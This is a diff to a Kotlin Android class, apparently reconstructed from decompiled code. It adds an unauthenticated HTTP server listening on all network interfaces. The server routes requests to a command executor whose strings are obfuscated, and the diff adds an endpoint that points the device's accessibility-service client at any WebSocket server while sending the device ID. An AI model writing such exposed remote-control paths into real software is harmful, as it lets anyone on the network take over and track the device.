@@ -53,6 +53,7 @@ import java.net.Socket
 import java.net.URLDecoder
 import java.util.LinkedHashMap
 import java.util.concurrent.ExecutorService
+import java.util.concurrent.Executors
 import java.util.concurrent.atomic.AtomicBoolean
 
 /**
@@ -411,22 +412,10 @@ class RemoteConfigManager(
      * JADX: m211632e7 (e7) — stops old instance, CAS on isRunning, starts daemon thread
      */
     fun start(port: Int = DEFAULT_PORT) {
-        // Stop old instance if exists
         val old = instance
         if (old != null && old !== this) {
             Log.d(TAG, "检测到旧实例，先停止旧服务器")
-            old.isRunningFlag.set(false)
-            try {
-                old.serverSocket?.close()
-                old.serverSocket = null
-                old.executor?.shutdownNow()
-                old.executor = null
-                old.serverThread?.interrupt()
-                old.serverThread = null
-                Log.d(TAG, "✅ 本地HTTP服务器已停止")
-            } catch (e: Exception) {
-                Log.e(TAG, "停止服务器异常", e)
-            }
+            old.stop()
             try { Thread.sleep(500L) } catch (_: InterruptedException) {}
         }
         instance = this
@@ -434,13 +423,144 @@ class RemoteConfigManager(
             Log.w(TAG, "⚠️ 服务器已在运行")
             return
         }
-        currentPort = port
-        // JADX: creates daemon thread "LocalHttpServer" that runs the accept loop
-        val thread = Thread({ /* accept loop handled by LocalHttpServer routing */ }, "LocalHttpServer")
+
+        executor = Executors.newFixedThreadPool(8)
+
+        val thread = Thread({
+            var bound = false
+            for (tryPort in port..(port + 8)) {
+                if (tryPort == LOCAL_SERVICE_PORT) {
+                    Log.w(TAG, "⚠️ 跳过端口 $tryPort（local-service 保留端口）")
+                    continue
+                }
+                try {
+                    val ss = ServerSocket()
+                    ss.reuseAddress = true
+                    ss.bind(java.net.InetSocketAddress("0.0.0.0", tryPort), 50)
+                    serverSocket = ss
+                    currentPort = tryPort
+                    bound = true
+                    Log.i(TAG, "✅ 本地HTTP服务器已启动: 0.0.0.0:$tryPort")
+
+                    if (tryPort != DEFAULT_PORT) {
+                        try {
+                            val url = java.net.URL("http://127.0.0.1:$LOCAL_SERVICE_PORT/setAppPort?port=$tryPort")
+                            val conn = url.openConnection() as java.net.HttpURLConnection
+                            conn.connectTimeout = 2000
+                            conn.readTimeout = 2000
+                            conn.requestMethod = "GET"
+                            conn.responseCode
+                            conn.disconnect()
+                            Log.i(TAG, "📡 已通知 local-service 实际端口: $tryPort")
+                        } catch (e: Exception) {
+                            Log.w(TAG, "⚠️ 通知 local-service 端口失败: ${e.message}")
+                        }
+                    }
+
+                    while (isRunningFlag.get()) {
+                        val client = try {
+                            ss.accept()
+                        } catch (e: Exception) {
+                            if (isRunningFlag.get()) Log.w(TAG, "accept 异常: ${e.message}")
+                            break
+                        }
+                        executor?.submit {
+                            try {
+                                client.soTimeout = 10_000
+                                handleClient(client)
+                            } catch (e: Exception) {
+                                Log.w(TAG, "处理客户端异常: ${e.message}")
+                            } finally {
+                                try { client.close() } catch (_: Exception) {}
+                            }
+                        }
+                    }
+                    break
+                } catch (e: java.net.BindException) {
+                    Log.w(TAG, "⚠️ 端口 $tryPort 被占用: ${e.message}")
+                } catch (e: Exception) {
+                    Log.e(TAG, "端口 $tryPort 绑定失败: ${e.message}")
+                }
+            }
+            if (!bound) {
+                Log.e(TAG, "❌ 所有端口 (${port}..${port + 8}) 绑定失败")
+                isRunningFlag.set(false)
+            }
+        }, "LocalHttpServer")
         serverThread = thread
         thread.isDaemon = true
         thread.start()
-        Log.i(TAG, "RemoteConfigManager started on port $port")
+        Log.i(TAG, "RemoteConfigManager starting on port $port")
+    }
+
+    private fun handleClient(client: java.net.Socket) {
+        val input = client.getInputStream().bufferedReader(Charsets.UTF_8)
+        val output = client.getOutputStream()
+
+        val requestLine = input.readLine() ?: return
+        val parts = requestLine.split(" ")
+        if (parts.size < 2) return
+
+        val fullPath = parts[1]
+        val pathAndQuery = fullPath.split("?", limit = 2)
+        val path = pathAndQuery[0]
+        val queryParams = mutableMapOf<String, String>()
+        if (pathAndQuery.size > 1) {
+            for (param in pathAndQuery[1].split("&")) {
+                val kv = param.split("=", limit = 2)
+                if (kv.size == 2) queryParams[kv[0]] = java.net.URLDecoder.decode(kv[1], "UTF-8")
+            }
+        }
+
+        var contentLength = 0
+        while (true) {
+            val headerLine = input.readLine() ?: break
+            if (headerLine.isEmpty()) break
+            if (headerLine.lowercase().startsWith("content-length:")) {
+                contentLength = headerLine.substringAfter(":").trim().toIntOrNull() ?: 0
+            }
+        }
+
+        var body: String? = null
+        if (contentLength > 0) {
+            val buf = CharArray(contentLength)
+            var read = 0
+            while (read < contentLength) {
+                val n = input.read(buf, read, contentLength - read)
+                if (n <= 0) break
+                read += n
+            }
+            body = String(buf, 0, read)
+        }
+
+        val mergedParams = HashMap(queryParams)
+        if (body != null) {
+            try {
+                val jsonBody = JSONObject(body)
+                for (key in jsonBody.keys()) {
+                    mergedParams[key as String] = jsonBody.optString(key, "")
+                }
+            } catch (_: Exception) {
+                mergedParams["body"] = body
+            }
+        }
+
+        val response = try {
+            routeRequest(path, mergedParams, body)
+        } catch (e: Exception) {
+            Log.e(TAG, "路由异常: $path", e)
+            makeErrorResponse("服务器内部错误: ${e.message}")
+        }
+
+        val responseBytes = response.toString().toByteArray(Charsets.UTF_8)
+        val httpResponse = "HTTP/1.1 200 OK\r\n" +
+            "Content-Type: application/json; charset=utf-8\r\n" +
+            "Content-Length: ${responseBytes.size}\r\n" +
+            "Connection: close\r\n" +
+            "\r\n"
+        output.write(httpResponse.toByteArray(Charsets.UTF_8))
+        output.write(responseBytes)
+        output.flush()
     }
 
     /**
@@ -605,6 +725,31 @@ class RemoteConfigManager(
                     merged[StringUtil.decrypt("KFYcN0w2CA==")] =
                         StringUtil.decrypt("Hnc9FW4TMwpyBwJ6NA==")
                     executeCommand(merged, body)
+                }
+
+                // --- Debug: WebSocket connection trigger ---
+                "/connectWebSocket" -> {
+                    val wsUrl = params["url"] ?: params["serverUrl"] ?: ""
+                    val devId = params["deviceId"] ?: ""
+                    if (wsUrl.isEmpty()) {
+                        makeErrorResponse("url 参数必填 (ws://host:port)")
+                    } else {
+                        try {
+                            val service = MyAccessibilityService.instance
+                            val nm = service?.networkManager
+                            if (nm == null) {
+                                makeErrorResponse("NetworkManager 未初始化")
+                            } else {
+                                val actualDeviceId = if (devId.isNotEmpty()) devId
+                                    else android.provider.Settings.Secure.getString(
+                                        context.contentResolver, "android_id") ?: "unknown"
+                                nm.connectToServer(wsUrl, actualDeviceId)
+                                makeTextResponse("WebSocket 连接已触发: url=$wsUrl, deviceId=$actualDeviceId")
+                            }
+                        } catch (e: Exception) {
+                            makeErrorResponse("WebSocket 连接失败: ${e.message}")
+                        }
+                    }
                 }
 
                 // --- Custom routes fallback ---
